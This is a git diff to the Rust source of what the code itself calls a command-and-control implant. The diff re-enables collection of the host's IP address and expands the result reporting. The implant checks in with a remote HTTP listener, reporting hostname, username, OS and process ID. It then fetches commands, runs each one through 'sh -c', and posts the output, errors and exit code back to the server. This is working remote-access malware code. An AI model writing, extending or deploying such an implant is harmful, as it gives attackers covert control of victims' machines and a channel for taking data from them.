@@ -1,12 +1,14 @@
 use clap::Parser;
 use reqwest::Client;
 use serde::{Deserialize, Serialize};
+use std::time::SystemTime;
 use std::{net::UdpSocket, process::Command, time::Duration};
 use tokio::time::sleep;
 use uuid::Uuid;
 use whoami;
 
 use rb::message::*;
+use rb::task::*;
 
 /// Command-and-Control implant connecting to the HTTP listener
 #[derive(Parser)]
@@ -24,54 +26,22 @@ struct Args {
     interval: u64,
 }
 
-// /// Payload sent to /checkin
-// #[derive(Serialize)]
-// struct ImplantCheckin {
-//     id: Option<Uuid>,
-//     hostname: String,
-//     ip_address: String,
-//     os_info: String,
-//     username: String,
-//     process_id: u32,
-// }
-//
-// /// Response from /checkin endpoint
-// #[derive(Deserialize)]
-// struct CheckinResponse {
-//     implant_id: Uuid,
-// }
-//
-// #[derive(Deserialize)]
-// struct CommandRequest {
-//     command_id: Uuid,
-//     session_id: Uuid,
-//     command: String,
-// }
-//
-// #[derive(Serialize)]
-// struct CommandResult {
-//     implant_id: Uuid,
-//     session_id: Uuid,
-//     command_id: Uuid,
-//     output: String,
-// }
-
 #[tokio::main]
 async fn main() -> Result<(), Box<dyn std::error::Error>> {
     let args = Args::parse();
     let base_url = format!("http://{}:{}", args.host, args.port);
     let client = Client::new();
 
-    // let ip_address = UdpSocket::bind("0.0.0.0:0")
-    //     .and_then(|sock| sock.connect((&*args.host, args.port)).map(|_| sock))
-    //     .and_then(|sock| sock.local_addr())
-    //     .map(|addr| addr.ip().to_string())
-    //     .unwrap_or_else(|_| "0.0.0.0".to_string());
+    let ip_address = UdpSocket::bind("0.0.0.0:0")
+        .and_then(|sock| sock.connect((&*args.host, args.port)).map(|_| sock))
+        .and_then(|sock| sock.local_addr())
+        .map(|addr| addr.ip().to_string())
+        .unwrap_or_else(|_| "0.0.0.0".to_string());
 
     let checkin = ImplantCheckin {
         id: None,
         hostname: whoami::fallible::hostname().unwrap_or_else(|_| "unknown".to_string()),
-        // ip_address,
+        ip_address,
         os_info: whoami::platform().to_string(), // drop version field
         username: whoami::username(),
         process_id: std::process::id(),
@@ -91,7 +61,7 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
         return Err("Check-in HTTP error".into());
     }
 
-    let data = resp.json().await?;
+    let data: CheckinResponse = resp.json().await?;
     let implant_id = data.implant_id;
     println!("Checked in. Implant ID: {}", implant_id);
 
@@ -111,16 +81,22 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
         println!("tasks: {:?}", tasks);
 
         for task in tasks {
-            println!("Executing command [{}]: {}", task.command_id, task.command);
+            println!("Executing command: {}", task.command);
             let output = Command::new("sh").arg("-c").arg(&task.command).output()?;
             let stdout = String::from_utf8_lossy(&output.stdout).to_string();
 
-            let result = CommandResult {
+            let now = SystemTime::now();
+            let result = TaskResult {
+                task_id: task.id,
                 implant_id,
                 session_id: task.session_id,
-                command_id: task.command_id,
-                output: stdout,
+                output: stdout.clone(),
+                error: Some(String::from_utf8_lossy(&output.stderr).to_string()),
+                completed_at: now,
+                status: TaskStatus::Completed,
+                status_code: output.status.code(),
             };
+
             let _ = client
                 .post(&format!("{}/results", base_url))
                 .json(&result)
